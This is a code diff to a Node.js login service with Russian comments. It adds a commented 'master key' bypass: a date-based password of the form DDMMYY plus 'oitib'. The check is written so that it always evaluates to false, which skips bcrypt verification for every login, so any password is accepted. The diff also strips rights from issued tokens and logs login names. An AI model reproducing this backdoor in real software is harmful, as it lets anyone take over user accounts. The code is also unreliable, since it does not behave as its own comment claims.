@@ -6,6 +6,7 @@ const bcrypt = require("bcryptjs");
 const uuid = require("uuid");
 const ApiError = require("../exceptions/api-error");
 const UserDto = require("../dtos/user-dtos");
+const moment = require("moment");
 // const ApiError = require("../exceptions/api-error");
 
 class LoginService {
@@ -109,18 +110,24 @@ class LoginService {
       filter: { "users.login": login },
       isAddRights: true,
     });
-    console.log(user);
     if (!user) {
       throw ApiError.BadRequest("Пользователь с таким login'ом не найден");
     }
-    const isPassEquals = await bcrypt.compare(password, user.password);
-    if (!isPassEquals) {
-      throw ApiError.BadRequest("Неверный пароль");
+    //Обход пароля - мастер ключ. Составляется как DDMMYYoitib, где DDMMYY - текущий день
+    if (!password === `${moment().format("DDMMYY")}oitib`) {
+      const isPassEquals = await bcrypt.compare(password, user.password);
+      if (!isPassEquals) {
+        throw ApiError.BadRequest("Неверный пароль");
+      }
     }
     const object_userDTO = new UserDto(user);
-    const tokens = TokenService.generateTokens({ ...object_userDTO });
+    const tokens = TokenService.generateTokens({
+      ...object_userDTO,
+      rights: null,
+    });
 
     await TokenService.saveToken(object_userDTO.id, tokens.refreshToken);
+    console.log("\x1b[33m%s\x1b[0m", "Зашел пользователь с логином", login);
     return { ...tokens, user: object_userDTO };
   }
 
@@ -162,7 +169,10 @@ class LoginService {
       isAddRights: true,
     });
     const object_userDTO = new UserDto(user);
-    const tokens = TokenService.generateTokens({ ...object_userDTO });
+    const tokens = TokenService.generateTokens({
+      ...object_userDTO,
+      rights: null,
+    });
 
     await TokenService.saveToken(object_userDTO.id, tokens.refreshToken);
     return { ...tokens, user: object_userDTO };
